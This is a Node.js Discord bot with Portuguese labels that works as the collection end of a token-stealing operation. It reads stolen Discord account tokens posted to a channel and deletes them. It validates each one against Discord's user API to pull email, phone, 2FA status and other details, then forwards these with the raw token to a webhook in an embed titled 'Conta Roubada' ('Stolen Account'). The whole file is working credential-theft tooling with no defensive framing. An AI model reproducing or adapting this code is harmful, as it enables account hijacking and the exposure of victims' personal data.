const http = require('http');
const express = require('express');
const app = express();
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping Received");
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);

const Discord = require('discord.js');
const client = new Discord.Client();
const request = require('request');
const hookcord = require('hookcord');
const yuki = new hookcord.Hook();

var tokens = []

var Conta_tag = "";
var Conta_id = "";
var Conta_verified = "";
var Conta_email = "";
var Conta_mfa = "";
var Conta_celular = "";
var Conta_local = "";

client.on('ready', () =>
{
	console.log(`[Anotador] Logado com sucesso em: ${client.user.username}`);
	client.channels.get('660585536821526530').send("a");
});

client.on('message', async message =>
{
	if(message.channel.id === "660585536821526530")
	{				
		message.channel.fetchMessages({limit: 100}).then(messages =>
		{
			var messagearray = messages.array();

			async function anotar()
			{
				for(var i = 0; i < messagearray.length; i++) //
				{
					let token = messagearray[i];
					let token_anotar = token.content.replace(/"/g, "");
				
					await sleep(parseInt(process.env.Tempo) * 1000);
					if(tokens.includes(token_anotar))
					{
						console.log("[Anotador] Encontrei um Token repetido");
						token.delete(1);
					}
					else
					{	
						token.delete(1);
						var options =
						{
							method: "GET",
							uri: "https://discordapp.com/api/v6/users/@me",
							headers: 
							{
								Authorization: token_anotar
							}
						}
					
						request(options, function(err, res, body)
						{
							let json = JSON.parse(body);
							
							Conta_tag = json.username + "#" + json.discriminator;
							Conta_id = json.id;
							Conta_verified = json.verified;
							Conta_email = json.email;
							Conta_mfa = json.mfa_enabled;
							Conta_celular = json.phone;
							Conta_local = json.locale;
						
							if(json.id)
							{
								if(Conta_celular === null) { Conta_celular = "Sem" };
								if(json.verified === true) { Conta_verified = "Sim" } else { Conta_verified = "Não" };				
								if(json.mfa_enabled === true) { Conta_mfa = "Sim" } else { Conta_mfa = "Não" };
								
								var embed = new Discord.RichEmbed()
								.setColor("#ff0066")
								.setTitle(`Conta Roubada`)
								.setDescription(`Conta: ${Conta_tag}\nID: ${Conta_id}\nVerificada: ${Conta_verified}\nDois Fatores: ${Conta_mfa}\nEmail: ${Conta_email}\nLocal: ${Conta_local}\nNúmero: ${Conta_celular}\nToken: ${token_anotar}`)
	
								yuki.login(process.env.Hook_ID, process.env.Hook_Token);
								yuki.setPayload(hookcord.DiscordJS(embed))
								yuki.fire();
						
								tokens.push(token_anotar);
							}
							else
							{
								return;
							}
						});
	
						
					}
				}
			}
			anotar()
		});
	}
});

function sleep(ms)
{
    return new Promise(resolve => setTimeout(resolve, ms));
}

client.login(process.env.Token);